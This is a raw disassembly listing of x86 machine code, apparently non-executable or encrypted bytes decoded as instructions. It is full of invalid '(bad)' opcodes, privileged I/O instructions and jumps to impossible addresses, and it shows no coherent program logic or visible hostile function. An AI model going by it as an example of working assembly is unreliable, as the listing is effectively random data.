  40a948:	xor    ch,ch
  40a94a:	xchg   BYTE PTR ds:0xf5dcef96,al
  40a950:	icebp  
  40a951:	adc    BYTE PTR [edi-0x38],0x8f
  40a955:	xor    al,0x40
  40a957:	aas    
  40a958:	fsub   QWORD PTR [ebp+0x49c6b9c4]
  40a95e:	lods   eax,DWORD PTR ds:[esi]
  40a95f:	push   ebp
  40a960:	iret   
  40a961:	test   DWORD PTR [ebx],0x7781ecf
  40a967:	idiv   BYTE PTR [esi+esi*8-0x41]
  40a96b:	adc    edi,esp
  40a96d:	push   0x651d39f0
  40a972:	call   0xb99d6f39
  40a977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a978:	xor    eax,0x5c0c54b5
  40a97d:	into   
  40a97e:	cdq    
  40a97f:	outs   dx,DWORD PTR ds:[esi]
  40a980:	mov    bl,0x2d
  40a982:	xor    al,0x8e
  40a984:	or     DWORD PTR [ebx],0x52
  40a987:	(bad)  
  40a988:	cmp    dh,BYTE PTR [ecx-0x66]
  40a98b:	add    cl,BYTE PTR [edi+0x2c]
  40a98e:	stos   BYTE PTR es:[edi],al
  40a98f:	pop    esi
  40a990:	les    ebx,FWORD PTR [ebx+0x348dfc21]
  40a996:	ins    BYTE PTR es:[edi],dx
  40a997:	loop   0x40a9c6
  40a999:	mov    ah,cl
  40a99b:	fld    DWORD PTR [ebx+ebp*4+0x1776f5a9]
  40a9a2:	cmp    BYTE PTR [eax],0xa2
  40a9a5:	ret    
  40a9a6:	push   ebp
  40a9a7:	pushf  
  40a9a8:	xor    ebx,DWORD PTR [edi-0x31491698]
  40a9ae:	imul   ebx,edi,0x70
  40a9b1:	sbb    DWORD PTR [edi],0x9a5e0421
  40a9b7:	push   edx
  40a9b8:	ins    DWORD PTR es:[edi],dx
  40a9b9:	mov    ss,WORD PTR [esi]
  40a9bb:	and    DWORD PTR [edi+esi*8-0x2e],ecx
  40a9bf:	lock and eax,0xc8a11cd2
  40a9c5:	mov    al,ds:0xa8babdc3
  40a9ca:	stc    
  40a9cb:	pop    ecx
  40a9cc:	lods   eax,DWORD PTR ds:[esi]
  40a9cd:	adc    dh,0x94
  40a9d0:	mov    edi,0x95479833
  40a9d5:	jmp    0xf6a:0x589f7096
  40a9dc:	push   edi
  40a9dd:	scas   al,BYTE PTR es:[edi]
  40a9de:	push   cs
  40a9df:	sbb    dh,ch
  40a9e1:	(bad)  
  40a9e2:	clc    
  40a9e3:	imul   DWORD PTR [ecx+0x2e]
  40a9e6:	sbb    al,BYTE PTR ds:0x9ff954ec
  40a9ec:	push   cs
  40a9ed:	jg     0x40aa3b
  40a9ef:	cmp    BYTE PTR [edi],cl
  40a9f1:	push   esp
  40a9f2:	adc    ch,BYTE PTR [edi+0x53ec487a]
  40a9f8:	pop    ebx
  40a9f9:	mov    edi,0xefcb96e
  40a9fe:	daa    
  40a9ff:	outs   dx,BYTE PTR ds:[esi]
  40aa00:	adc    edi,DWORD PTR [edx-0x667df67b]
  40aa06:	xlat   BYTE PTR ds:[bx]
  40aa08:	push   edi
  40aa09:	xchg   edx,eax
  40aa0a:	ret    
  40aa0b:	push   0xa2a5a453
  40aa10:	stos   BYTE PTR es:[edi],al
  40aa11:	add    DWORD PTR [eax-0x14394ba2],edi
  40aa17:	adc    al,cl
  40aa19:	bndstx [ecx-0x6b6fc9ee],bnd2
  40aa20:	or     dh,0xd
  40aa23:	popf   
  40aa24:	test   BYTE PTR [esi+0x2e0b46ec],bl
  40aa2a:	nop
  40aa2b:	jle    0x40aa0c
  40aa2d:	and    edi,DWORD PTR [eax+ebx*2]
  40aa30:	out    dx,al
  40aa31:	hlt    
  40aa32:	shr    DWORD PTR [ecx-0x50],0x38
  40aa36:	mov    WORD PTR [ebp+0x60],ds
  40aa39:	xor    DWORD PTR [edx-0x44],esp
  40aa3c:	or     esp,DWORD PTR [edi-0x53c98d6b]
  40aa42:	icebp  
  40aa43:	jnp    0x40aa99
  40aa45:	(bad)  
  40aa46:	dec    esi
  40aa47:	cmp    DWORD PTR [edi+ebp*1+0xa],ebx
  40aa4b:	nop
  40aa4c:	sub    al,0xb0
  40aa4e:	sbb    cl,BYTE PTR [ebx-0x3d]
  40aa51:	dec    eax
  40aa52:	fidiv  DWORD PTR [ecx]
  40aa54:	pop    ds
  40aa55:	adc    DWORD PTR [bx+di-0x76],edi
  40aa59:	sbb    dl,BYTE PTR [ecx]
  40aa5b:	in     al,0xb9
  40aa5d:	ret    
  40aa5e:	(bad)  
  40aa5f:	cdq    
  40aa60:	inc    esi
  40aa61:	aam    0xd0
  40aa63:	ds daa 
  40aa65:	or     cl,dl
  40aa67:	dec    ecx
  40aa68:	sbb    bh,BYTE PTR [edx-0x25]
  40aa6b:	cs sbb dh,ch
  40aa6e:	pop    es
  40aa6f:	in     eax,dx
  40aa70:	lods   eax,DWORD PTR ds:[esi]
  40aa71:	lds    edx,FWORD PTR [ebx-0x4316190a]
  40aa77:	pop    ebx
  40aa78:	push   0xfffffff2
  40aa7a:	cs xchg ebp,eax
  40aa7c:	leave  
  40aa7d:	stos   DWORD PTR es:[edi],eax
  40aa7e:	dec    ebp
  40aa7f:	enter  0x3baa,0x15
  40aa83:	lods   al,BYTE PTR ds:[esi]
  40aa84:	pop    edi
  40aa85:	push   ecx
  40aa86:	sbb    eax,0xd091d9e7
  40aa8b:	jno    0x40aae5
  40aa8d:	push   ebx
  40aa8e:	pop    ecx
  40aa8f:	shl    DWORD PTR [ebx+0x5],1
  40aa92:	pop    ebx
  40aa93:	das    
  40aa94:	arpl   WORD PTR [edi+0x40],si
  40aa97:	push   ss
  40aa98:	pop    ebx
  40aa99:	out    dx,eax
  40aa9a:	dec    eax
  40aa9b:	ins    DWORD PTR es:[edi],dx
  40aa9c:	dec    eax
  40aa9d:	jg     0x40aaf2
  40aa9f:	das    
  40aaa0:	or     DWORD PTR [ebx-0x1f],ebx
  40aaa3:	mov    bh,0xd9
  40aaa5:	push   ecx
  40aaa6:	fldcw  WORD PTR [edi+0x75fc2549]
  40aaac:	mov    eax,0xce7d34f9
  40aab1:	pop    eax
  40aab2:	mov    ah,0x54
  40aab4:	xchg   edx,eax
  40aab5:	das    
  40aab6:	jns    0x40aab0
  40aab8:	mul    BYTE PTR [edi]
  40aaba:	lea    ecx,[edx+ebp*1+0xe]
  40aabe:	aad    0x3b
  40aac0:	jne    0x40ab2f
  40aac2:	pusha  
  40aac3:	repz cmp BYTE PTR [ebx+0x66a46ea9],dh
  40aaca:	pop    esp
  40aacb:	push   es
  40aacc:	jb     0x40aac4
  40aace:	push   eax
  40aacf:	push   edi
  40aad0:	and    ax,0xe58a
  40aad4:	not    DWORD PTR [ebx-0x21]
  40aad7:	add    dx,WORD PTR [ebx+0x74]
  40aadb:	(bad)  
  40aadc:	loop   0x40aadf
  40aade:	push   ebx
  40aadf:	(bad)  
  40aae0:	fistp  WORD PTR [eax+0x23]
  40aae3:	sahf   
  40aae4:	jbe    0x40aac7
  40aae6:	xchg   esi,eax
  40aae7:	out    dx,al
  40aae8:	lods   eax,DWORD PTR ds:[esi]
  40aae9:	push   es
  40aaea:	fidivr DWORD PTR [edx]
  40aaec:	adc    ebp,esi
  40aaee:	lock jno 0x40ab2e
  40aaf1:	pop    ss
  40aaf2:	nop
  40aaf3:	cdq    
  40aaf4:	jns    0x40ab30
  40aaf6:	loopne 0x40ab32
  40aaf8:	mov    eax,?
  40aafa:	sub    BYTE PTR [ecx+0x7b],ah
  40aafd:	jg     0x40aaf1
  40aaff:	pop    esi
  40ab00:	int    0x83
  40ab02:	push   edx
  40ab03:	rol    BYTE PTR [ebp-0xb],1
  40ab06:	or     DWORD PTR [ecx+0x3b],ebp
  40ab09:	or     bh,dl
  40ab0b:	cmc    
  40ab0c:	int    0x92
  40ab0e:	and    al,0x28
  40ab10:	out    dx,al
  40ab11:	rcr    BYTE PTR [eax],cl
  40ab13:	cli    
  40ab14:	or     eax,0x17e607f6
  40ab19:	inc    edx
  40ab1a:	add    cl,ah
  40ab1c:	add    bh,BYTE PTR [ebx+0xf]
  40ab1f:	adc    al,0x23
  40ab21:	dec    edx
  40ab22:	leave  
  40ab23:	das    
  40ab24:	sub    BYTE PTR [ebp-0x6c],dh
  40ab27:	loope  0x40aadd
  40ab29:	add    DWORD PTR [ecx+0x5efc5d3c],0xffffffff
  40ab30:	or     DWORD PTR [ebp-0x65e54c28],esi
  40ab36:	(bad)  
  40ab38:	mov    esp,0xf7c7aae1
  40ab3d:	leave  
  40ab3e:	jecxz  0x40ab9d
  40ab40:	add    BYTE PTR ss:[ebx],0x38
  40ab44:	fcom   QWORD PTR [ecx-0x398ef856]
  40ab4a:	add    esi,ecx
  40ab4c:	inc    esp
  40ab4d:	mov    ds:0x300674af,al
  40ab52:	les    esi,FWORD PTR [ebx+0x3c769504]
  40ab58:	pop    ss
  40ab59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab5a:	(bad)
  40ab5d:	dec    ebx
  40ab5e:	in     al,0x5f
  40ab60:	aas    
  40ab61:	(bad)  
  40ab62:	jb     0x40abc3
  40ab64:	loop   0x40ab24
  40ab66:	inc    BYTE PTR ds:0xb0b6dc3b
  40ab6c:	or     DWORD PTR [ecx+0x70],esp
  40ab6f:	jbe    0x40ab9c
  40ab71:	sbb    BYTE PTR [edi-0x7fdd8782],cl
  40ab77:	pop    ss
  40ab78:	cmp    bh,BYTE PTR [ebp-0x6]
  40ab7b:	(bad)  [edx-0x58]
  40ab7e:	mov    ecx,0x56f58d82
  40ab83:	int3   
  40ab84:	pop    ss
  40ab85:	out    0x37,al
  40ab87:	ss push ss
  40ab89:	test   al,0x2c
  40ab8b:	mov    bh,0xde
  40ab8d:	or     al,0xdd
  40ab8f:	(bad)  
  40ab90:	aam    0xe8
  40ab92:	std    
  40ab93:	mov    al,0x58
  40ab95:	shl    DWORD PTR [esi],1
  40ab97:	fild   QWORD PTR [ebp-0x59]
  40ab9a:	int    0x50
  40ab9c:	fstp   DWORD PTR [esi-0x2f]
  40ab9f:	xor    DWORD PTR [eax],edi
  40aba1:	jbe    0x40abb6
  40aba3:	sbb    eax,0x366ab964
  40aba8:	add    eax,0xbb817e83
  40abad:	mov    ecx,0x56c5c9b4
  40abb2:	xchg   esp,eax
  40abb3:	shl    DWORD PTR [ecx],1
  40abb5:	dec    ebp
  40abb6:	inc    DWORD PTR [edx-0x6a02e71d]
  40abbc:	push   es
  40abbd:	nop
  40abbe:	call   0xdff3:0x545dc90c
  40abc5:	retf   0xd68f
  40abc8:	jnp    0x40abf3
  40abca:	in     eax,dx
  40abcb:	fcomp  QWORD PTR [esi]
  40abcd:	pop    esi
  40abce:	adc    DWORD PTR [edi-0x1c],0x2e
  40abd2:	jge    0x40ab6d
  40abd4:	push   0xf5913d12
  40abd9:	mov    edx,0xb9b886e0
  40abde:	leave  
  40abdf:	fsub   DWORD PTR ds:0x21336dc9
  40abe5:	pop    ebx
  40abe6:	aad    0x2e
  40abe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe9:	xchg   ebp,eax
  40abea:	or     DWORD PTR [eax+0x3b],edx
  40abed:	mov    BYTE PTR [edx],dh
  40abef:	mov    cl,BYTE PTR [esi+0x60db7dbb]
  40abf5:	cmc    
  40abf6:	push   ebp
  40abf7:	dec    edx
  40abf8:	xor    al,0xea
  40abfa:	sbb    eax,0xbab64392
  40abff:	mov    dl,0xd3
  40ac01:	sub    al,0x86
  40ac03:	loop   0x40ac34
  40ac05:	mov    eax,ds:0xc5f31b27
  40ac0a:	sbb    eax,0xd7aac218
  40ac0f:	rcr    DWORD PTR [esi-0x2c1d1eba],cl
  40ac15:	arpl   si,sp
  40ac17:	inc    edi
  40ac18:	push   ebx
  40ac19:	sbb    ah,ah
  40ac1b:	test   al,0x97
  40ac1d:	out    0x1f,eax
  40ac1f:	and    esi,DWORD PTR [esi]
  40ac21:	sbb    al,0xed
  40ac23:	cld    
  40ac24:	sub    eax,0x72c41b92
  40ac29:	pop    edx
  40ac2a:	sti    
  40ac2b:	mul    DWORD PTR [esi]
  40ac2d:	scas   eax,DWORD PTR es:[edi]
  40ac2e:	push   ebx
  40ac2f:	mov    al,ds:0x73981798
  40ac34:	test   al,0xdf
  40ac36:	inc    edi
  40ac37:	push   cs
  40ac38:	push   ebp
  40ac39:	iret   
  40ac3a:	mov    dl,0x3c
  40ac3c:	lahf   
  40ac3d:	mov    ebp,0xb10205c7
  40ac42:	aam    0xa3
  40ac44:	jecxz  0x40ac7e
  40ac46:	xchg   esi,eax
  40ac47:	std    
  40ac48:	das    
  40ac49:	inc    edx
  40ac4a:	repnz and al,0x56
  40ac4d:	cmp    dl,BYTE PTR [ebx]
  40ac4f:	xchg   edx,eax
  40ac50:	pop    ecx
  40ac51:	lea    edi,[edi+0x366a16b2]
  40ac57:	inc    ecx
  40ac58:	js     0x40abef
  40ac5a:	gs in  eax,0xf1
  40ac5d:	mov    eax,0xff1ec27a
  40ac62:	xchg   ecx,eax
  40ac63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac64:	das    
  40ac65:	ja     0x40abf2
  40ac67:	adc    eax,0xccf986fb
  40ac6c:	cwde   
  40ac6d:	(bad)  [ecx+0x6e75cf8c]
  40ac73:	out    dx,al
  40ac74:	fwait
  40ac75:	jns    0x40acc9
  40ac77:	push   ebp
  40ac78:	sbb    edi,DWORD PTR [ebx+0x3a366aff]
  40ac7e:	cmp    DWORD PTR [esi+0x1a9982ad],0x9e9e8d59
  40ac88:	sbb    eax,0x86d6b380
  40ac8d:	jp     0x40ac38
  40ac8f:	dec    edi
  40ac90:	(bad)  
  40ac91:	ret    
  40ac92:	jle    0x40ac2a
  40ac94:	pushfw 
  40ac96:	stc    
  40ac97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac98:	inc    esi
  40ac99:	mov    WORD PTR [ebx],gs
  40ac9b:	(bad)  
  40ac9c:	xlat   BYTE PTR ds:[ebx]
  40ac9d:	add    eax,0x70b4fbe
  40aca2:	(bad)  
  40aca3:	jmp    0xf5b16f48
  40aca8:	das    
  40aca9:	bound  ecx,QWORD PTR ss:[edx]
  40acac:	leave  
  40acad:	pop    esi
  40acae:	test   al,al
  40acb0:	std    
  40acb1:	jg     0x40ac58
  40acb3:	dec    ecx
  40acb4:	or     DWORD PTR [ebp+0x29],esp
  40acb7:	(bad)  
  40acb8:	xchg   edx,eax
  40acb9:	imul   edi,ebp,0xffffffab
  40acbc:	push   eax
  40acbd:	mov    ebp,0x870ff008
  40acc2:	movd   mm6,DWORD PTR [ecx-0x1b]
  40acc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acc7:	aad    0x8f
  40acc9:	movntps XMMWORD PTR [ecx-0x7e],xmm4
  40accd:	adc    bh,BYTE PTR [edi]
  40accf:	mov    bl,0xa6
  40acd1:	or     ch,cl
  40acd3:	mov    dl,0x91
  40acd5:	jg     0x40acc2
  40acd7:	jl     0x40ad29
  40acd9:	or     eax,0xbd471c8c
  40acde:	mov    ebx,0x2db60a8e
  40ace3:	mov    bl,0x71
  40ace5:	or     eax,esi
  40ace7:	mov    cl,0x9a
  40ace9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acea:	repz push ebp
  40acec:	out    dx,al
  40aced:	call   0x810425d5
  40acf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf3:	fisub  DWORD PTR [edi+0xac8a9a6]
  40acf9:	and    bl,BYTE PTR [edx+0x58]
  40acfc:	call   0x22558379
  40ad01:	jb     0x40ad80
  40ad03:	(bad)  
  40ad04:	xchg   edx,eax
  40ad05:	xor    dl,BYTE PTR [esi+0xb306562]
  40ad0b:	mov    bh,0x26
  40ad0d:	gs in  eax,0x32
  40ad10:	out    dx,al
  40ad11:	adc    edi,eax
  40ad13:	xchg   ebx,eax
  40ad14:	fld    QWORD PTR [edx]
  40ad16:	add    DWORD PTR [eax],edi
  40ad18:	dec    ecx
  40ad19:	jae    0x40ad64
  40ad1b:	mov    ebp,?
  40ad1d:	fisttp QWORD PTR [edx+0x5172a8e4]
  40ad23:	in     eax,dx
  40ad24:	add    DWORD PTR [esi+0x7a],esp
  40ad27:	loop   0x40ad86
  40ad29:	icebp  
  40ad2a:	jno    0x40ad15
  40ad2c:	je     0x40ad93
  40ad2e:	push   0x459a63e9
  40ad33:	rep stos BYTE PTR es:[edi],al
  40ad35:	jmp    0x64d62d61
  40ad3a:	cmp    al,0xad
  40ad3c:	and    bh,ch
  40ad3e:	arpl   WORD PTR [ebx+0x29735d8d],ax
  40ad44:	stos   DWORD PTR es:[edi],eax
  40ad45:	sbb    al,BYTE PTR [eax-0x3edb7e34]
  40ad4b:	jne    0x40adbb
  40ad4d:	pop    ecx
  40ad4e:	sub    al,0xf7
  40ad50:	xor    al,0x61
  40ad52:	in     eax,0x1a
  40ad54:	scas   al,BYTE PTR es:[edi]
  40ad55:	lds    edx,FWORD PTR [edi-0x72]
  40ad58:	add    DWORD PTR [ebx-0x45],eax
  40ad5b:	inc    ebp
  40ad5c:	mov    ah,0x82
  40ad5e:	push   0xffffff93
  40ad60:	mov    ebx,0x7851b8ec
  40ad65:	inc    ebp
  40ad66:	xor    cl,BYTE PTR [edx+0xa]
  40ad69:	ja     0x40ad79
  40ad6b:	add    DWORD PTR [eax],esp
  40ad6d:	xchg   DWORD PTR [eax+0x1d522fba],edx
  40ad73:	xor    ch,al
  40ad75:	add    dh,ah
  40ad77:	push   ds
  40ad78:	add    al,0x27
  40ad7a:	push   esi
  40ad7b:	(bad)  
  40ad7c:	aas    
  40ad7d:	jne    0x40ad61
  40ad7f:	sbb    edx,ebx
  40ad81:	jne    0x40adb9
  40ad83:	out    0xbe,eax
  40ad85:	test   eax,0x194255ae
  40ad8a:	mov    ds:0x4e880c9c,al
  40ad8f:	lahf   
  40ad90:	mov    ch,0x2d
  40ad92:	cmp    ebx,DWORD PTR [edi+0xba1b34a]
  40ad98:	rcr    DWORD PTR [eax+0x2479a88d],cl
  40ad9e:	push   esi
  40ad9f:	shr    DWORD PTR [ecx+esi*8-0x59c9b365],0x3b
  40ada7:	jmp    0x40ad9f
  40ada9:	and    dh,BYTE PTR [edx-0xb25a64]
  40adaf:	ffreep st(1)
  40adb1:	xor    dl,BYTE PTR [edi-0x60]
  40adb4:	pusha  
  40adb5:	mov    al,0xfe
  40adb7:	fisub  DWORD PTR ds:0x3678a486
  40adbd:	gs in  eax,0x34
  40adc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adc1:	mov    ch,0x9
  40adc3:	jl     0x40ada2
  40adc5:	aaa    
  40adc6:	test   bl,0x17
  40adc9:	mov    al,0x7c
  40adcb:	sub    DWORD PTR [esi-0x32],edi
  40adce:	int3   
  40adcf:	mov    ah,0x49
  40add1:	xlat   BYTE PTR ds:[ebx]
  40add2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add3:	stos   BYTE PTR es:[edi],al
  40add4:	iret   
  40add5:	inc    ebp
  40add6:	and    al,BYTE PTR [edx-0x10622a96]
  40addc:	popa   
  40addd:	popa   
  40adde:	repnz xor eax,0x6abfe01f
  40ade4:	(bad)  
  40ade5:	or     cl,dh
  40ade7:	push   esp
  40ade8:	lss    esi,FWORD PTR [edx+0x33]
  40adec:	sub    edi,DWORD PTR [esi]
  40adee:	jl     0x40adbc
  40adf0:	mov    ebp,0xc69ca1e7
  40adf5:	pop    ebx
  40adf6:	sub    al,0x2a
  40adf8:	in     al,0x18
  40adfa:	and    BYTE PTR [esi],ch
  40adfc:	xor    eax,0x508a29ce
  40ae01:	es dec eax
  40ae03:	or     dl,BYTE PTR [ecx+0x2e]
  40ae06:	(bad)  
  40ae07:	out    dx,eax
  40ae08:	loope  0x40adb2
  40ae0a:	mov    bh,0xd2
  40ae0d:	sub    esp,DWORD PTR [ebp+ebp*8-0x48]
  40ae11:	or     al,0x5f
  40ae13:	loope  0x40ae61
  40ae15:	mov    ecx,0x12791827
  40ae1a:	cld    
  40ae1b:	add    ch,BYTE PTR [ebp-0x4356ee9a]
  40ae21:	sbb    eax,0xdc4ae558
  40ae26:	jmp    0x40ade4
  40ae28:	xor    ah,bl
  40ae2a:	mov    ebp,0x4977d32b
  40ae2f:	fld    QWORD PTR [ecx-0x49]
  40ae32:	push   esp
  40ae33:	in     al,0xa0
  40ae35:	data16 jg 0x40adee
  40ae38:	dec    ebx
  40ae39:	inc    eax
  40ae3a:	or     eax,0x7ef9ef6d
  40ae3f:	mov    dl,0x5
  40ae41:	add    eax,0xbf5b6a2e
  40ae46:	jmp    0xef4e:0x9474e17c
  40ae4d:	arpl   WORD PTR [eax],sp
  40ae4f:	pushf  
  40ae50:	inc    ebp
  40ae51:	sar    bl,0x3d
  40ae54:	imul   ebx,DWORD PTR [ebp+0x176a3b7b],0x160a3c57
  40ae5e:	cmp    BYTE PTR [edx],0x82
  40ae61:	cwde   
  40ae62:	shl    DWORD PTR [ebx-0x48940942],1
  40ae68:	mov    eax,ds:0xa4c381a4
  40ae6d:	nop
  40ae6e:	std    
  40ae6f:	mov    edx,0xa95c585d
  40ae74:	sbb    BYTE PTR [ebp-0x9],bh
  40ae77:	into   
  40ae78:	in     al,dx
  40ae79:	pop    es
  40ae7a:	push   eax
  40ae7b:	push   0x575ffdd6
  40ae80:	mov    esi,0x4e3f011f
  40ae85:	pop    edx
  40ae86:	pusha  
  40ae87:	adc    DWORD PTR [eax-0x260b15e],edi
  40ae8d:	push   cs
  40ae8e:	ror    BYTE PTR [ecx],1
  40ae90:	js     0x40ae45
  40ae92:	or     bh,dh
  40ae94:	int    0x84
  40ae96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae97:	and    ah,al
  40ae99:	and    BYTE PTR [eax-0x11],dh
  40ae9c:	cdq    
  40ae9d:	mov    al,0xf9
  40ae9f:	popa   
  40aea0:	pop    edx
  40aea1:	fnsave [ebx]
  40aea3:	xchg   DWORD PTR ds:0xb790ed7a,ebx
  40aea9:	add    eax,0x23843b40
  40aeae:	and    dh,0xa8
  40aeb1:	(bad)  
  40aeb2:	call   0xedc4d4c9
  40aeb7:	mov    esi,0xfc5ac2bf
  40aebc:	jae    0x40ae5a
  40aebe:	add    eax,0x9ba3a8f1
  40aec3:	and    ecx,DWORD PTR [ebx]
  40aec5:	add    DWORD PTR [eax+ebx*8+0x7a],esi
  40aec9:	jno    0x40af11
  40aecb:	xor    BYTE PTR [esi+0x7c57f4f9],ah
  40aed1:	(bad)  
  40aed2:	aas    
  40aed3:	mov    WORD PTR [ecx+0x5d2be702],cs
  40aed9:	inc    ecx
  40aeda:	cmp    ah,0x4d
  40aedd:	neg    DWORD PTR cs:[ebx+0x5f711ffb]
  40aee4:	jge    0x40af2d
  40aee6:	inc    ecx
  40aee7:	clc    
  40aee8:	(bad)  
  40aee9:	icebp  
  40aeea:	pop    edi
  40aeeb:	ror    BYTE PTR [eax-0x390a0f3f],cl
  40aef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef2:	std    
  40aef3:	cs jns 0x40af10
  40aef6:	outs   dx,BYTE PTR ds:[esi]
  40aef7:	outs   dx,BYTE PTR ds:[esi]
  40aef8:	(bad)  
  40aef9:	cmp    eax,0xdcd8d533
  40aefe:	or     esp,DWORD PTR [eax]
  40af00:	jno    0x40aee3
  40af02:	pop    edx
  40af03:	scas   eax,DWORD PTR es:[edi]
  40af04:	jle    0x40aefd
  40af06:	cmc    
  40af07:	sar    DWORD PTR [edi],cl
  40af09:	outs   dx,DWORD PTR ds:[esi]
  40af0a:	jg     0x40af31
  40af0c:	dec    ecx
  40af0d:	or     DWORD PTR [eax+esi*8],esp
  40af10:	mov    ds:0x1c0f23b2,eax
  40af15:	sub    al,0xc0
  40af17:	inc    ebx
  40af18:	push   edx
  40af19:	les    esi,FWORD PTR [eax-0x7af24cfd]
  40af1f:	rcl    BYTE PTR [eax+0x6238a7b2],cl
  40af25:	fs add eax,0x569934cd
  40af2b:	icebp  
  40af2c:	mov    ebp,0x7a8f26fa
  40af31:	fcomp  QWORD PTR [esi+0x66]
  40af34:	and    al,0xf3
  40af36:	sti    
  40af37:	in     eax,0x26
  40af39:	push   0xfffffffa
  40af3b:	or     BYTE PTR [eax],ah
  40af3d:	add    BYTE PTR [ebx+0x10],al
  40af40:	add    esp,DWORD PTR [ebx-0x69383a8d]
  40af46:	fdivr  st(2),st
  40af48:	test   BYTE PTR [esi],ch
  40af4a:	cmp    ah,BYTE PTR [eax+0x5665870e]
  40af50:	xor    eax,0x9026b89c
  40af55:	call   DWORD PTR [edi+0x61]
  40af58:	iret   
  40af59:	lods   al,BYTE PTR ds:[esi]
  40af5a:	mov    cl,0xa4
  40af5c:	fcmove st,st(0)
  40af5e:	clc    
  40af5f:	sub    ah,al
  40af61:	dec    edi
  40af62:	in     eax,dx
  40af63:	push   edx
  40af64:	dec    eax
  40af65:	dec    edx
  40af66:	dec    eax
  40af67:	cdq    
  40af68:	fisub  DWORD PTR [ebx]
  40af6a:	inc    ecx
  40af6b:	cmp    ebx,ecx
  40af6d:	or     esi,ebx
  40af6f:	xor    DWORD PTR [esi*4-0x296b1876],esi
  40af76:	iret   
  40af77:	stos   DWORD PTR es:[edi],eax
  40af78:	push   ebp
  40af79:	mov    ebp,DWORD PTR [esi+0x2a25516e]
  40af7f:	aaa    
  40af80:	jp     0x40af40
  40af82:	jae    0x40af26
  40af84:	or     DWORD PTR [eiz*8+0x4f82c6ae],0x29
  40af8c:	ins    BYTE PTR es:[edi],dx
  40af8d:	xor    ebp,DWORD PTR [edi]
  40af8f:	(bad)  
  40af90:	ins    DWORD PTR es:[edi],dx
  40af91:	sbb    eax,0x2913371b
  40af96:	jnp    0x40b00f
  40af98:	sub    dl,cl
  40af9a:	mov    edi,0x54c7edda
  40af9f:	inc    ebx
  40afa0:	fst    DWORD PTR [edi-0x6e]
  40afa3:	in     al,dx
  40afa4:	mov    edi,0x99014350
  40afa9:	out    dx,eax
  40afaa:	sar    dl,0x5
  40afad:	(bad)
  40afb0:	or     dh,cl
  40afb2:	hlt    
  40afb3:	imul   esp,DWORD PTR [edi+0x7dcf2d59],0xf84c9446
  40afbd:	push   ebx
  40afbe:	(bad)  [esi]
  40afc0:	sub    esi,DWORD PTR [ecx+0x74]
  40afc3:	outs   dx,DWORD PTR ds:[esi]
  40afc4:	ror    ebx,0x18
  40afc7:	aam    0x8
  40afc9:	out    dx,al
  40afca:	lods   al,BYTE PTR ds:[esi]
  40afcb:	or     al,0x5f
  40afcd:	aad    0xfc
  40afcf:	push   ebx
  40afd0:	bound  eax,QWORD PTR [esi+0x2f0a46c2]
  40afd6:	and    BYTE PTR [eax],bl
  40afd8:	or     DWORD PTR [ebx-0x19e188c8],ebx
  40afde:	fmulp  st(0),st
  40afe0:	das    
  40afe1:	ja     0x40afb2
  40afe3:	pop    eax
  40afe4:	int3   
  40afe5:	dec    ebx
  40afe6:	mov    ch,0xbc
  40afe8:	je     0x40af9c
  40afea:	add    ebp,DWORD PTR [ebx-0x10b80266]
  40aff0:	jge    0x40afd3
  40aff2:	loop   0x40af91
  40aff4:	dec    edx
  40aff5:	adc    bh,BYTE PTR [esi+0x26]
  40aff8:	and    esi,DWORD PTR [esi]
  40affa:	mov    edx,0xf3c1fd3c
  40afff:	push   edx
  40b000:	mov    ch,0xfa
  40b002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b003:	push   ecx
  40b004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b005:	daa    
  40b006:	mov    edx,0xf8794b75
  40b00b:	and    cl,BYTE PTR [edi+0x7b]
  40b00e:	hlt    
  40b00f:	cmp    DWORD PTR [ecx],eax
  40b011:	sub    BYTE PTR [ebx-0x4b],bh
  40b014:	adc    DWORD PTR [eax],esi
  40b016:	push   ebp
  40b017:	push   0xfffffffc
  40b019:	pop    ebp
  40b01a:	pop    ebp
  40b01b:	adc    DWORD PTR [edx],0xffffff95
  40b01e:	push   edi
  40b01f:	out    dx,al
  40b020:	call   0x5bfeb843
  40b025:	pop    esi
  40b026:	aas    
  40b027:	std    
  40b028:	hlt    
  40b029:	inc    ebp
  40b02a:	inc    edx
  40b02b:	iret   
  40b02c:	dec    edx
  40b02d:	sbb    ecx,DWORD PTR [ecx+0x52]
  40b030:	and    cl,BYTE PTR fs:[esi-0x2e]
  40b034:	pusha  
  40b035:	call   0x18c5:0x7e80d3cf
  40b03c:	mov    fs,WORD PTR [esi+0x6942d568]
  40b042:	mov    esp,0xf26b6695
  40b047:	or     al,0x29
  40b049:	ret    
  40b04a:	xor    al,0xd0
  40b04c:	inc    edi
  40b04d:	cmp    eax,0xe2937342
  40b052:	mov    ebp,0x93f3cbc5
  40b057:	mov    al,0x4
  40b059:	inc    edi
  40b05a:	xor    al,0xe7
  40b05c:	int3   
  40b05d:	inc    eax
  40b05e:	je     0x40b0cb
  40b060:	mov    edi,0x4a7d5536
  40b065:	aaa    
  40b066:	pop    ds
  40b067:	pop    es
  40b068:	jge    0x40b09c
  40b06a:	mov    ds:0x7218226e,eax
  40b06f:	dec    DWORD PTR [ebx+0x73979cbe]
  40b075:	mov    bh,0x7c
  40b077:	in     al,0x0
  40b079:	shl    BYTE PTR [ebp+0x43],cl
  40b07c:	and    al,0x82
  40b07e:	mov    ecx,0x8666e950
  40b083:	sbb    DWORD PTR [edx-0x467e6ecf],0xec300ac5
  40b08d:	add    edx,DWORD PTR [eax-0x4e05469d]
  40b093:	(bad)  
  40b094:	jns    0x40b09e
  40b096:	imul   esi,DWORD PTR [ebx-0x279fdd78],0xfddeab2e
  40b0a0:	pop    ss
